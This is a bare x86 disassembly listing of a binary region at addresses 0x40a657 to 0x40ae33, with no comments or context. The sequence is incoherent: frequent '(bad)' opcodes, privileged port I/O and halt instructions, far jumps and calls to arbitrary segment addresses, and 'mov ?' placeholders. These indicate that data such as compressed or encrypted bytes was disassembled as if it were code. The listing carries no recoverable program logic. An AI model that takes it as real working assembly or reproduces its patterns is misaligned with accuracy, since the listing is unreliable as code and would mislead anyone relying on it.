  40a657:	shl    BYTE PTR [ebx+0x25],cl
  40a65a:	sbb    esp,0x10
  40a65d:	fadd   QWORD PTR [esp+eax*1+0x4]
  40a661:	fst    st(4)
  40a663:	and    dl,ah
  40a665:	push   edx
  40a666:	(bad)  
  40a667:	scas   eax,DWORD PTR es:[edi]
  40a668:	mov    esp,0x4d763ad1
  40a66d:	cmp    al,0xbc
  40a66f:	xchg   esi,eax
  40a670:	dec    ebp
  40a671:	fisttp WORD PTR [ebx-0x6f6819ba]
  40a677:	mov    ds:0x9c883f66,al
  40a67c:	cmp    dl,BYTE PTR [ebx+0x6b]
  40a67f:	clc    
  40a680:	arpl   dx,bp
  40a682:	hlt    
  40a683:	push   edx
  40a684:	xchg   esp,eax
  40a685:	fnop   
  40a687:	mov    ds:0xdcc6c3bc,al
  40a68c:	shl    cl,0x49
  40a68f:	add    ebp,eax
  40a691:	(bad)  
  40a692:	repz rol DWORD PTR [eax-0x7eddb08f],1
  40a699:	enter  0xe4bc,0x25
  40a69d:	push   ss
  40a69e:	add    BYTE PTR [eax-0x2b],al
  40a6a1:	inc    esp
  40a6a2:	xchg   edx,eax
  40a6a3:	test   eax,0x6007093b
  40a6a8:	xor    al,0x30
  40a6aa:	xchg   ebx,eax
  40a6ab:	cmp    bl,BYTE PTR [eax-0x60]
  40a6ae:	and    eax,0xaae4284d
  40a6b3:	push   DWORD PTR [edx+eax*8]
  40a6b6:	inc    edx
  40a6b7:	jp     0x40a72e
  40a6b9:	sbb    esi,DWORD PTR [eax-0x16]
  40a6bc:	jbe    0x40a63f
  40a6be:	shr    DWORD PTR [eax+0x4f612077],1
  40a6c4:	fchs   
  40a6c6:	push   0xca16f12f
  40a6cb:	push   es
  40a6cc:	or     ebp,ebp
  40a6ce:	imul   edx,DWORD PTR [esi],0x9c072d87
  40a6d4:	xchg   esi,eax
  40a6d5:	mov    bl,0xbd
  40a6d7:	fwait
  40a6d8:	mov    al,ds:0xcc893606
  40a6dd:	(bad)  
  40a6de:	(bad)  
  40a6df:	mov    eax,eax
  40a6e1:	xor    edi,esi
  40a6e3:	out    dx,al
  40a6e4:	or     al,0xe6
  40a6e6:	mov    esp,0x4b825f6c
  40a6eb:	fstp   QWORD PTR [edx]
  40a6ed:	inc    eax
  40a6ee:	fcom   DWORD PTR [ebx+0x2e]
  40a6f1:	dec    edi
  40a6f2:	sbb    edx,DWORD PTR [ebx+ebp*1-0x297873c1]
  40a6f9:	jmp    0x40a6a0
  40a6fb:	test   al,0x69
  40a6fd:	inc    esp
  40a6fe:	mov    dh,0xb6
  40a700:	jb     0x40a695
  40a702:	call   0x323c672a
  40a707:	call   0xd3999473
  40a70c:	cmp    BYTE PTR [ebp+0x790fb6a8],bh
  40a712:	mov    ?,edi
  40a714:	mov    ah,0x76
  40a716:	pop    DWORD PTR [eax]
  40a718:	ret    
  40a719:	pop    esp
  40a71a:	inc    edx
  40a71b:	or     esp,esi
  40a71d:	xor    DWORD PTR [edi-0x2c],ebx
  40a720:	in     eax,0xc6
  40a722:	lds    edi,FWORD PTR [ebx]
  40a724:	aam    0xd
  40a726:	or     BYTE PTR [edx],bh
  40a728:	retf   
  40a729:	test   ch,0xf6
  40a72c:	aas    
  40a72d:	nop
  40a72e:	pop    ebx
  40a72f:	lods   al,BYTE PTR ds:[esi]
  40a730:	dec    esp
  40a731:	mov    ecx,0x25c39fa4
  40a736:	xor    BYTE PTR [edx+0x59],0xfb
  40a73a:	xlat   BYTE PTR ds:[ebx]
  40a73b:	test   al,0x60
  40a73d:	sti    
  40a73e:	out    dx,eax
  40a73f:	lds    ecx,FWORD PTR [eax+0x38]
  40a742:	dec    esi
  40a743:	and    BYTE PTR [eax+0x1b],ch
  40a746:	pop    edx
  40a747:	mov    esi,0x1059e2be
  40a74c:	xchg   ebp,eax
  40a74d:	xchg   DWORD PTR [ebx],ebx
  40a74f:	div    al
  40a751:	push   es
  40a752:	pop    ss
  40a753:	dec    ebx
  40a754:	dec    ebp
  40a755:	and    ch,BYTE PTR [esi-0x58]
  40a758:	push   ecx
  40a759:	(bad)  
  40a75a:	stos   BYTE PTR es:[edi],al
  40a75b:	dec    ecx
  40a75c:	xchg   esi,eax
  40a75d:	ins    DWORD PTR es:[edi],dx
  40a75e:	dec    eax
  40a75f:	mov    al,ss:0xae552583
  40a765:	sub    cl,BYTE PTR [edx+0x2c]
  40a768:	mov    DWORD PTR [edi-0x5e],esi
  40a76b:	test   eax,0x3e3239c1
  40a770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a771:	sbb    al,0x1c
  40a773:	mov    al,ds:0x373be787
  40a778:	push   ebx
  40a779:	test   al,0xab
  40a77b:	or     BYTE PTR [eax],al
  40a77d:	adc    edx,0x64
  40a780:	pop    ebx
  40a781:	pop    es
  40a782:	mov    eax,0x1fe8cece
  40a787:	and    BYTE PTR [esi-0x67],cl
  40a78a:	ds pop esi
  40a78c:	sbb    esi,DWORD PTR [esi]
  40a78e:	xor    al,0x75
  40a790:	popa   
  40a791:	out    0xff,eax
  40a793:	mov    ah,0x3a
  40a795:	aad    0xdc
  40a797:	test   dl,al
  40a799:	push   ebx
  40a79a:	add    ch,BYTE PTR [esp+edi*8-0x20b74121]
  40a7a1:	mov    bl,BYTE PTR [eax+0x45]
  40a7a4:	popa   
  40a7a5:	jg     0x40a745
  40a7a7:	ret    0x26ee
  40a7aa:	retf   0xbbdd
  40a7ad:	jno    0x40a76c
  40a7af:	(bad)  
  40a7b0:	jmp    0x40a7ca
  40a7b2:	fdiv   DWORD PTR [edi+0x31b2d97f]
  40a7b8:	mov    DWORD PTR [ebx+0x7],eax
  40a7bb:	daa    
  40a7bc:	pop    edx
  40a7bd:	imul   edi,DWORD PTR [ebx],0xffffff92
  40a7c0:	aas    
  40a7c1:	mov    ecx,0x7c4477f2
  40a7c6:	jne    0x40a842
  40a7c8:	loope  0x40a80e
  40a7ca:	and    al,0x59
  40a7cc:	test   DWORD PTR [ebx+0x5c],esp
  40a7cf:	sbb    BYTE PTR [esi-0x7c5732c1],al
  40a7d5:	xor    esp,DWORD PTR [ebp-0x44]
  40a7d8:	dec    eax
  40a7d9:	xchg   ebp,eax
  40a7da:	pushf  
  40a7db:	cwde   
  40a7dc:	sub    ecx,DWORD PTR [edi+esi*8]
  40a7df:	mov    ds:0x818bf3f5,al
  40a7e4:	mov    ah,BYTE PTR [esi-0x49635a8d]
  40a7ea:	adc    esp,esi
  40a7ec:	pop    ds
  40a7ed:	xchg   edx,eax
  40a7ee:	xor    BYTE PTR [esi-0x84ccf1],al
  40a7f4:	fnstsw WORD PTR [ebp+0x577fe30]
  40a7fa:	les    esi,FWORD PTR [esp+eax*1-0xbe9b79b]
  40a801:	adc    BYTE PTR [esi+0x33557cf7],cl
  40a807:	out    dx,eax
  40a808:	inc    edx
  40a809:	jno    0x40a7ac
  40a80b:	sbb    eax,0x8e91b79d
  40a810:	mul    dh
  40a812:	mov    ecx,0x787f442
  40a817:	(bad)  
  40a818:	loopne 0x40a7ca
  40a81a:	sbb    ecx,DWORD PTR [esi]
  40a81c:	push   ebp
  40a81d:	adc    eax,0x1853f4a8
  40a822:	loope  0x40a7b5
  40a824:	push   ds
  40a825:	mov    dl,0x23
  40a827:	dec    ecx
  40a828:	and    DWORD PTR [ebx+0x56],esi
  40a82b:	dec    edx
  40a82c:	adc    al,0x4c
  40a82e:	dec    ebx
  40a82f:	xchg   edx,eax
  40a830:	inc    esp
  40a831:	sub    edi,edi
  40a833:	sbb    DWORD PTR [esi],edi
  40a835:	push   ebp
  40a836:	mov    esi,ebp
  40a838:	ficom  DWORD PTR [edx-0x5ca2f5f6]
  40a83e:	dec    edx
  40a83f:	pop    ss
  40a840:	into   
  40a841:	and    ah,BYTE PTR [esi+0x264b4d24]
  40a847:	fist   DWORD PTR [edi+0x72f9cf28]
  40a84d:	mov    ah,bl
  40a84f:	add    ebx,DWORD PTR ds:0xd09b457d
  40a855:	sub    al,0xe9
  40a857:	fild   DWORD PTR [ecx-0x2df91f7f]
  40a85d:	sar    DWORD PTR [edi+0x77],cl
  40a860:	in     eax,0xd2
  40a862:	gs (bad) 
  40a865:	in     al,0x32
  40a867:	cmc    
  40a868:	ja     0x40a851
  40a86a:	lea    edi,[edi]
  40a86c:	and    edx,0xffffff9c
  40a86f:	mov    edx,DWORD PTR [ebx+0x7ed44222]
  40a875:	add    ebx,DWORD PTR [eax-0x1c3bf354]
  40a87b:	stc    
  40a87c:	inc    ecx
  40a87d:	pop    ds
  40a87e:	sbb    al,0xea
  40a880:	push   ebp
  40a881:	and    eax,0x1549459
  40a886:	loop   0x40a892
  40a888:	rol    ebp,0xa5
  40a88b:	sub    edx,0x87b2e4f2
  40a891:	mov    dh,0x65
  40a893:	leave  
  40a894:	mov    bh,0xf9
  40a896:	into   
  40a897:	out    0xc5,al
  40a899:	or     BYTE PTR [esi-0x4e4a0d93],bl
  40a89f:	mov    ah,0x2c
  40a8a1:	daa    
  40a8a2:	adc    eax,0xacd6de0a
  40a8a7:	add    dh,BYTE PTR [esi+0x4e9a2a]
  40a8ad:	shl    ah,0x9e
  40a8b0:	push   es
  40a8b1:	(bad)  
  40a8b2:	out    dx,al
  40a8b3:	ficomp WORD PTR [ecx+0x66]
  40a8b6:	inc    esi
  40a8b7:	inc    ebx
  40a8b8:	mov    eax,DWORD PTR [ebx+0x467cc21b]
  40a8be:	xor    cl,BYTE PTR [eax+0x4f6b6f96]
  40a8c4:	mov    bl,BYTE PTR [edi+0x4a]
  40a8c7:	mov    edx,?
  40a8c9:	sbb    BYTE PTR [ebx-0x53],ah
  40a8cc:	sti    
  40a8cd:	dec    eax
  40a8ce:	dec    ebx
  40a8cf:	mov    eax,0x4374e210
  40a8d4:	jecxz  0x40a88b
  40a8d6:	rcr    esp,1
  40a8d8:	aaa    
  40a8d9:	or     ebx,edi
  40a8db:	xor    DWORD PTR [ebp-0x478aec4b],ebx
  40a8e1:	test   dh,bh
  40a8e3:	shl    BYTE PTR [edx],1
  40a8e5:	out    0xaa,eax
  40a8e7:	mov    dh,BYTE PTR [ebx-0x56e226a8]
  40a8ed:	loopne 0x40a921
  40a8ef:	fcom   QWORD PTR [edx]
  40a8f1:	or     BYTE PTR [eax],ch
  40a8f3:	cli    
  40a8f4:	mov    al,ds:0x9f4fa2f8
  40a8f9:	das    
  40a8fa:	jge    0x40a8b9
  40a8fc:	sbb    cl,ah
  40a8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ff:	inc    ecx
  40a900:	xchg   ebp,eax
  40a901:	sbb    BYTE PTR [edi-0x64d26ea1],0x55
  40a908:	jo     0x40a96f
  40a90a:	inc    eax
  40a90b:	setnp  BYTE PTR [edi-0x7b2c3069]
  40a912:	cmp    dl,bl
  40a914:	cmp    DWORD PTR [edi+0x600eeaec],ebx
  40a91a:	stos   DWORD PTR es:[edi],eax
  40a91b:	push   esi
  40a91c:	xor    al,0xcb
  40a91e:	add    edx,edi
  40a920:	mov    esp,0xec8d1fd1
  40a925:	dec    edi
  40a926:	outs   dx,DWORD PTR ds:[esi]
  40a927:	repz dec esi
  40a929:	ss out 0x2a,al
  40a92c:	mov    esi,0x84b7ce14
  40a931:	xor    DWORD PTR [edi-0x71],edx
  40a934:	retf   
  40a935:	mov    ah,0xc6
  40a937:	rol    BYTE PTR [eax],cl
  40a939:	add    BYTE PTR [esp+eax*4],0x6f
  40a93d:	arpl   WORD PTR [ebx+0x67],di
  40a940:	test   BYTE PTR [esi],0x2c
  40a943:	out    dx,eax
  40a944:	lahf   
  40a945:	rol    esp,0x39
  40a948:	ins    DWORD PTR es:[edi],dx
  40a949:	push   eax
  40a94a:	mov    ch,0x43
  40a94c:	inc    eax
  40a94d:	ret    
  40a94e:	mov    ebx,0xca82de7c
  40a953:	pop    ebx
  40a954:	retf   
  40a955:	xchg   ebx,eax
  40a956:	(bad)  
  40a957:	jmp    0x40a971
  40a959:	out    dx,al
  40a95a:	leave  
  40a95b:	lea    ebp,[edi+0x72523272]
  40a961:	popa   
  40a962:	sbb    al,0x12
  40a964:	mov    bl,0x2a
  40a966:	aas    
  40a967:	enter  0xc31,0xf
  40a96b:	arpl   bx,ax
  40a96d:	je     0x40a8f1
  40a96f:	repz adc al,0xd5
  40a972:	pop    ecx
  40a973:	push   ds
  40a974:	cs mov ah,0x84
  40a977:	int    0xd8
  40a979:	jge    0x40a959
  40a97b:	fld    DWORD PTR [ecx]
  40a97d:	iret   
  40a97e:	push   edi
  40a97f:	int3   
  40a980:	pushf  
  40a981:	jo     0x40a98a
  40a983:	int    0x4c
  40a985:	ja     0x40a96a
  40a987:	sub    eax,0xa4122a35
  40a98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a98d:	inc    ebp
  40a98e:	or     eax,0x3afc6085
  40a993:	or     DWORD PTR ds:[edx+0x35],edi
  40a997:	adc    esi,ecx
  40a999:	dec    eax
  40a99a:	add    ebp,edi
  40a99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a99d:	xchg   edi,eax
  40a99e:	dec    esi
  40a99f:	in     al,dx
  40a9a0:	sub    BYTE PTR [ebx],0xdc
  40a9a3:	out    0xbb,eax
  40a9a5:	cdq    
  40a9a6:	sbb    bl,0xd6
  40a9a9:	fldenv [eax+0x19]
  40a9ac:	cwde   
  40a9ad:	or     DWORD PTR [esi-0x34],edi
  40a9b0:	mov    DWORD PTR [edx-0x14],esp
  40a9b3:	repnz add DWORD PTR [ebp-0x61],edx
  40a9b7:	ins    BYTE PTR es:[edi],dx
  40a9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b9:	lods   al,BYTE PTR ds:[esi]
  40a9ba:	inc    edi
  40a9bb:	sbb    ebx,ecx
  40a9bd:	cwde   
  40a9be:	clc    
  40a9bf:	or     BYTE PTR [ebx+0x0],cl
  40a9c2:	cmp    eax,DWORD PTR [esi-0x4e392d1e]
  40a9c8:	inc    esi
  40a9c9:	jmp    0x84db:0x412f4c9
  40a9d0:	mov    bl,cl
  40a9d2:	mov    edi,0xb14f1934
  40a9d7:	mov    DWORD PTR [ebp+0xac9f067],ebx
  40a9dd:	pop    ds
  40a9de:	fwait
  40a9df:	aaa    
  40a9e0:	xchg   esi,eax
  40a9e1:	mov    edx,0x810361a0
  40a9e6:	sbb    DWORD PTR [eax+0x18],esp
  40a9e9:	xchg   ecx,eax
  40a9ea:	jne    0x40aa2d
  40a9ec:	pop    edi
  40a9ed:	dec    esp
  40a9ee:	mov    ah,0x6e
  40a9f0:	cmp    al,BYTE PTR [eax]
  40a9f2:	lods   al,BYTE PTR ds:[esi]
  40a9f3:	data16 test BYTE PTR [ebx+edi*8-0x3dcc53d6],bh
  40a9fb:	fcmovbe st,st(4)
  40a9fd:	or     ecx,edx
  40a9ff:	in     al,dx
  40aa00:	xor    ebp,edi
  40aa02:	mov    edi,0xe5f3b8de
  40aa07:	ret    
  40aa08:	mov    al,ds:0x34ff445e
  40aa0d:	jmp    0x40a9a4
  40aa0f:	pushf  
  40aa10:	xlat   BYTE PTR ds:[ebx]
  40aa11:	imul   ebx,DWORD PTR [eax-0x32373a0b],0x9f81c5fd
  40aa1b:	dec    ebp
  40aa1c:	mov    esi,0xf5b44f68
  40aa21:	mov    al,0x92
  40aa23:	loopne 0x40aa01
  40aa25:	sahf   
  40aa26:	inc    ebp
  40aa27:	les    ebx,FWORD PTR [ecx-0xa4f12ec]
  40aa2d:	addr16 inc edx
  40aa2f:	pop    ebx
  40aa30:	jl     0x40aaaf
  40aa32:	dec    esp
  40aa33:	mov    esp,0x644f152a
  40aa38:	aad    0xcf
  40aa3a:	lds    ecx,FWORD PTR [ebp-0x3534b61b]
  40aa40:	jae    0x40aa0e
  40aa42:	inc    ebx
  40aa43:	sbb    esi,edi
  40aa45:	(bad)  
  40aa46:	retf   
  40aa47:	shl    di,cl
  40aa4a:	jmp    0x40aa66
  40aa4c:	dec    ecx
  40aa4d:	dec    esp
  40aa4e:	inc    ebp
  40aa4f:	pusha  
  40aa50:	call   0x76fd91dc
  40aa55:	xor    BYTE PTR [edi+esi*4],ch
  40aa58:	dec    edi
  40aa59:	cld    
  40aa5a:	adc    al,0xca
  40aa5c:	lahf   
  40aa5d:	fcom   QWORD PTR [edx]
  40aa5f:	test   al,0xd4
  40aa61:	pop    edx
  40aa62:	es ins BYTE PTR es:[edi],dx
  40aa64:	push   esi
  40aa65:	mov    ds,WORD PTR [esi]
  40aa67:	inc    esp
  40aa68:	adc    edx,edi
  40aa6a:	dec    edx
  40aa6b:	sbb    al,BYTE PTR [ecx-0x7090c112]
  40aa71:	push   esi
  40aa72:	inc    eax
  40aa73:	or     cl,BYTE PTR [edx+0x4c4a5c8f]
  40aa79:	adc    DWORD PTR [edx+edi*2],edi
  40aa7c:	cli    
  40aa7d:	pop    esi
  40aa7e:	push   ds
  40aa7f:	push   eax
  40aa80:	cmp    esp,0xe85e4e8c
  40aa86:	shl    DWORD PTR [edi-0x5c],cl
  40aa89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa8a:	push   0x6f
  40aa8c:	adc    edi,DWORD PTR [esi-0x78]
  40aa8f:	mov    bh,0xc5
  40aa91:	scas   al,BYTE PTR es:[edi]
  40aa92:	cdq    
  40aa93:	scas   eax,DWORD PTR es:[edi]
  40aa94:	push   ds
  40aa95:	mov    fs,eax
  40aa97:	adc    BYTE PTR [edx+esi*8-0x3c851daf],dh
  40aa9e:	push   cs
  40aa9f:	(bad)  
  40aaa0:	retf   
  40aaa1:	mov    eax,ds:0x64ee68f4
  40aaa6:	in     al,dx
  40aaa7:	fld    QWORD PTR [eax+0x49]
  40aaaa:	popf   
  40aaab:	xchg   edi,eax
  40aaac:	ss and ch,dl
  40aaaf:	test   DWORD PTR [ecx+0x32],0x3f2bbddb
  40aab6:	stos   BYTE PTR es:[edi],al
  40aab7:	cmp    cl,BYTE PTR [ebx-0x6c9e891b]
  40aabd:	hlt    
  40aabe:	arpl   sp,ax
  40aac0:	push   0xfffffff4
  40aac2:	rcr    BYTE PTR [edi+0x16cbfdf9],0xfb
  40aac9:	(bad)  
  40aaca:	and    al,0x5c
  40aacc:	fldenv [esi]
  40aace:	adc    al,BYTE PTR [edx-0x35]
  40aad1:	pop    eax
  40aad2:	lods   al,BYTE PTR ds:[esi]
  40aad3:	dec    esp
  40aad4:	xor    ecx,DWORD PTR [ecx-0x4fb5f85c]
  40aada:	shl    BYTE PTR [bp+si],0xb1
  40aade:	xlat   BYTE PTR ds:[ebx]
  40aadf:	sbb    DWORD PTR ds:0x6c8fce72,0x7f
  40aae6:	jmp    DWORD PTR [esi+eiz*4]
  40aae9:	or     al,0xb0
  40aaeb:	adc    DWORD PTR [ebp+0x6d],edi
  40aaee:	out    0x1,eax
  40aaf0:	jmp    0x40ab5a
  40aaf2:	lea    eax,[edx+0x76f2a146]
  40aaf8:	inc    ecx
  40aaf9:	push   ebx
  40aafa:	xchg   edi,eax
  40aafb:	mov    bl,0x19
  40aafd:	adc    DWORD PTR [ebx-0x47265ade],ecx
  40ab03:	mov    ch,0x9b
  40ab05:	imul   esp,DWORD PTR [eax+0x4a],0xfe3159ac
  40ab0c:	jmp    0xc7d17c0a
  40ab11:	lods   eax,DWORD PTR fs:[esi]
  40ab13:	push   edi
  40ab14:	addr16 sti 
  40ab16:	jns    0x40ab7a
  40ab18:	jne    0x40ab69
  40ab1a:	mov    ch,0x8f
  40ab1c:	inc    edi
  40ab1d:	mov    bh,0xc2
  40ab1f:	sbb    ecx,DWORD PTR [edx+0x6dd0ccf0]
  40ab25:	xchg   BYTE PTR [edx],dh
  40ab27:	(bad)  
  40ab28:	aam    0x2b
  40ab2a:	cwde   
  40ab2b:	push   ebx
  40ab2c:	int3   
  40ab2d:	push   edx
  40ab2e:	(bad)  
  40ab2f:	mov    edi,0x23d05a5b
  40ab34:	inc    esp
  40ab35:	xor    al,0x7f
  40ab37:	inc    edx
  40ab38:	mov    edi,0x71ccd293
  40ab3d:	test   BYTE PTR [ebp-0x60],bl
  40ab40:	repz daa 
  40ab42:	mov    ds:0x55592bbc,eax
  40ab47:	mov    edi,0x3b568447
  40ab4c:	mov    eax,ds:0x5c5284e9
  40ab51:	jne    0x40aba7
  40ab53:	clc    
  40ab54:	rol    DWORD PTR es:0x42fc5b4a,0xf9
  40ab5c:	dec    ebx
  40ab5d:	daa    
  40ab5e:	in     al,0xfb
  40ab60:	repnz push edx
  40ab62:	sub    al,0x5a
  40ab64:	mov    eax,gs
  40ab66:	in     al,0x32
  40ab68:	jmp    FWORD PTR [edx]
  40ab6a:	inc    esi
  40ab6b:	push   ebx
  40ab6c:	leave  
  40ab6d:	dec    edi
  40ab6e:	retf   0xfcf7
  40ab71:	addr16 cld 
  40ab73:	outs   dx,BYTE PTR ds:[esi]
  40ab74:	inc    edi
  40ab75:	mov    DWORD PTR cs:[edx],ebx
  40ab78:	int3   
  40ab79:	or     eax,0xefc6fc67
  40ab7e:	outs   dx,BYTE PTR ds:[esi]
  40ab7f:	xlat   BYTE PTR ds:[ebx]
  40ab80:	and    ch,BYTE PTR [ecx+0x1a]
  40ab83:	out    dx,eax
  40ab84:	test   ch,dh
  40ab86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab87:	inc    eax
  40ab88:	fmul   st(6),st
  40ab8a:	and    cl,BYTE PTR [esp+eiz*2]
  40ab8d:	push   edx
  40ab8e:	ja     0x40abbf
  40ab90:	push   es
  40ab91:	(bad)  
  40ab92:	retf   
  40ab93:	cdq    
  40ab94:	fst    st(6)
  40ab96:	jge    0x40ab91
  40ab98:	lsl    ebp,WORD PTR [ebp+0x74]
  40ab9c:	inc    esi
  40ab9d:	mov    esi,0x216fc46b
  40aba2:	lea    ecx,[edi+0x2481be04]
  40aba8:	and    al,0x75
  40abaa:	jns    0x40abb3
  40abac:	sbb    ch,BYTE PTR [edx]
  40abae:	fs jns 0x40ab39
  40abb1:	xor    al,BYTE PTR [eax-0x7837f624]
  40abb7:	push   eax
  40abb8:	or     al,BYTE PTR [edi-0x4e6695e]
  40abbe:	push   es
  40abbf:	push   ds
  40abc0:	sub    esp,ebx
  40abc2:	ins    BYTE PTR es:[edi],dx
  40abc3:	and    eax,eax
  40abc5:	int3   
  40abc6:	push   ss
  40abc7:	jl     0x40ac09
  40abc9:	(bad)  
  40abcb:	xor    al,0x75
  40abcd:	ins    BYTE PTR es:[edi],dx
  40abce:	push   0x9203a255
  40abd3:	sub    eax,0x7a6a6039
  40abd8:	sbb    BYTE PTR [edi-0x79],dh
  40abdb:	(bad)  
  40abdc:	sahf   
  40abdd:	cmp    BYTE PTR [esi+0x58fc192d],ah
  40abe3:	in     al,dx
  40abe4:	mov    al,ds:0xbce4cb58
  40abe9:	sub    BYTE PTR [ebp+0x431ce610],dl
  40abef:	push   ds
  40abf0:	pushf  
  40abf1:	(bad)  
  40abf2:	xchg   esp,eax
  40abf3:	sbb    DWORD PTR [edi-0x60],eax
  40abf6:	gs xchg ebx,eax
  40abf8:	or     eax,0x3dd69974
  40abfd:	adc    al,0xde
  40abff:	enter  0x1493,0x8b
  40ac03:	sbb    al,0x88
  40ac05:	stos   DWORD PTR es:[edi],eax
  40ac06:	cdq    
  40ac07:	retf   0x86ad
  40ac0a:	mov    ebx,0x307026cd
  40ac0f:	fs inc edx
  40ac11:	in     al,dx
  40ac12:	xchg   ecx,eax
  40ac13:	fisubr WORD PTR [ebx+0x2a]
  40ac16:	jp     0x40abba
  40ac18:	leave  
  40ac19:	sub    BYTE PTR [edi+ebx*2-0x7f3c0df],bh
  40ac20:	jmp    0x40abd0
  40ac22:	hlt    
  40ac23:	dec    ebp
  40ac24:	daa    
  40ac25:	adc    bl,BYTE PTR [eax+0x2ab3a68f]
  40ac2b:	or     eax,0x8e30b090
  40ac30:	xor    DWORD PTR [ebp+0x6dcc4917],0x76
  40ac37:	lea    eax,ds:0x52ec12c2
  40ac3d:	call   0x6f12:0xda4c92c8
  40ac44:	or     al,0x5a
  40ac46:	cmp    ah,ch
  40ac48:	jmp    0x40acbd
  40ac4a:	xlat   BYTE PTR ds:[ebx]
  40ac4b:	popf   
  40ac4c:	jg     0x40acad
  40ac4e:	nop
  40ac4f:	dec    edi
  40ac50:	pop    edi
  40ac51:	and    eax,0x50556b3f
  40ac56:	pop    ds
  40ac57:	jge    0x40ac0c
  40ac59:	push   edi
  40ac5a:	call   0x965f05fc
  40ac5f:	mov    bh,0xe1
  40ac61:	test   al,0xba
  40ac63:	pop    esi
  40ac64:	pop    ebp
  40ac65:	cli    
  40ac66:	mov    dl,0xcb
  40ac68:	xor    BYTE PTR [eax-0x32],al
  40ac6b:	sbb    eax,0xb5b92e9d
  40ac70:	cmc    
  40ac71:	(bad)  
  40ac72:	push   eax
  40ac73:	and    esi,DWORD PTR [ecx-0x39608de1]
  40ac79:	fisubr DWORD PTR ds:0x3d8ff223
  40ac7f:	imul   esi,DWORD PTR [ebp-0x13],0xe42c315d
  40ac86:	std    
  40ac87:	pop    esp
  40ac88:	lock cmp al,BYTE PTR [ecx-0xe]
  40ac8c:	arpl   WORD PTR [ebx],dx
  40ac8e:	xor    eax,0x7e2754e
  40ac93:	stos   DWORD PTR es:[edi],eax
  40ac94:	sub    al,BYTE PTR [eax]
	...
  40ad12:	add    BYTE PTR [eax],al
  40ad14:	add    DWORD PTR [ebx+0x5c],0xffffff8f
  40ad18:	fcomp  QWORD PTR [edi+0x66e84fd3]
  40ad1e:	push   0x34
  40ad20:	imul   edx,DWORD PTR ss:[ecx-0x3a],0x5eb8
  40ad28:	imul   eax,DWORD PTR [edi],0x78dd0000
  40ad2e:	inc    ecx
  40ad2f:	inc    esi
  40ad30:	jge    0x40ad4d
  40ad32:	ins    DWORD PTR es:[edi],dx
  40ad33:	jmp    0x3ce5:0xaea86e4d
  40ad3a:	out    dx,al
  40ad3b:	pop    ebp
  40ad3c:	pop    ebp
  40ad3d:	fild   QWORD PTR [edx+0x7a]
  40ad40:	xchg   DWORD PTR [ebx],esi
  40ad42:	ucomiss xmm6,DWORD PTR ss:[eax+0x3e]
  40ad47:	popa   
  40ad48:	clc    
  40ad49:	dec    edx
  40ad4a:	(bad)  
  40ad4b:	(bad)  
  40ad4c:	in     eax,dx
  40ad4d:	daa    
  40ad4e:	mov    esi,0x1bba89eb
  40ad53:	mov    ebx,0x32f9873c
  40ad58:	fwait
  40ad59:	dec    esp
  40ad5a:	int3   
  40ad5b:	jmp    0x40ad81
  40ad5d:	cmp    bl,BYTE PTR [edi+0x17]
  40ad60:	adc    BYTE PTR [esp+ebx*1+0x3b],cl
  40ad64:	pop    eax
  40ad65:	cwde   
  40ad66:	add    al,dl
  40ad68:	loop   0x40ad87
  40ad6a:	jmp    0x6935:0xb34674f7
  40ad71:	out    0xb9,al
  40ad73:	cmp    eax,0x450eb48
  40ad78:	jb     0x615ba378
  40ad7e:	and    eax,0x2f3b3ca4
  40ad83:	xlat   BYTE PTR ds:[ebx]
  40ad84:	nop
  40ad85:	test   al,0x7b
  40ad87:	enter  0x8d6e,0xda
  40ad8b:	jle    0x40ad1c
  40ad8d:	push   ecx
  40ad8e:	and    edi,DWORD PTR [esi+0x59]
  40ad91:	cli    
  40ad92:	cld    
  40ad93:	and    eax,0x75c55d5c
  40ad98:	cs std 
  40ad9a:	mov    edx,0x5975852d
  40ad9f:	das    
  40ada0:	jmp    0x5f7ec913
  40ada5:	imul   ebp,esp,0xffffffba
  40ada8:	test   DWORD PTR ss:[eax],esp
  40adab:	cmp    BYTE PTR ds:0x8ccd1067,cl
  40adb1:	ds pushf 
  40adb3:	or     DWORD PTR [ebx+0x72],eax
  40adb6:	dec    esp
  40adb7:	pop    eax
  40adb8:	xor    edx,ebx
  40adba:	or     eax,0xae3d1339
  40adbf:	pop    ss
  40adc0:	(bad)  
  40adc1:	jb     0x40ad50
  40adc3:	lods   eax,DWORD PTR ds:[esi]
  40adc4:	jae    0x40ae42
  40adc6:	ss xor eax,0xefbe6ee7
  40adcc:	fdivr  DWORD PTR [edi]
  40adce:	out    dx,al
  40adcf:	xor    dl,cl
  40add1:	call   0xdb99:0x206a90d2
  40add8:	sbb    eax,0x65
  40addb:	pop    ss
  40addc:	pusha  
  40addd:	in     eax,dx
  40adde:	in     eax,0x9a
  40ade0:	out    0x6d,al
  40ade2:	dec    ebp
  40ade3:	add    DWORD PTR ds:0xeceab988,esp
  40ade9:	inc    ebx
  40adea:	lds    ebp,FWORD PTR [ebp+ecx*1+0x58b87b4e]
  40adf1:	xchg   esi,eax
  40adf2:	mov    ah,0x8f
  40adf4:	sub    esp,DWORD PTR [edi]
  40adf6:	dec    edx
  40adf7:	addr16 cmp edi,ebp
  40adfa:	mov    al,0x9c
  40adfc:	dec    edx
  40adfd:	aaa    
  40adfe:	xlat   BYTE PTR ds:[ebx]
  40adff:	dec    cx
  40ae01:	xlat   BYTE PTR ds:[ebx]
  40ae02:	mov    dl,BYTE PTR [esi]
  40ae04:	and    DWORD PTR [ebx],edx
  40ae06:	leave  
  40ae07:	shr    BYTE PTR [ebx-0x546be63a],cl
  40ae0d:	fimul  WORD PTR [eax]
  40ae0f:	xchg   esi,eax
  40ae10:	xor    eax,0x8f22e3d
  40ae15:	int    0xae
  40ae17:	ficom  WORD PTR [ebp-0x1d]
  40ae1b:	test   BYTE PTR [ecx-0x1f3a8564],dh
  40ae21:	std    
  40ae22:	push   0xffffff8b
  40ae24:	mov    edx,0xec9bdcb3
  40ae29:	inc    di
  40ae2b:	shl    DWORD PTR [ecx+0x45fbe79c],1
  40ae31:	pop    es
  40ae32:	inc    eax
  40ae33:	js     0x40ae13
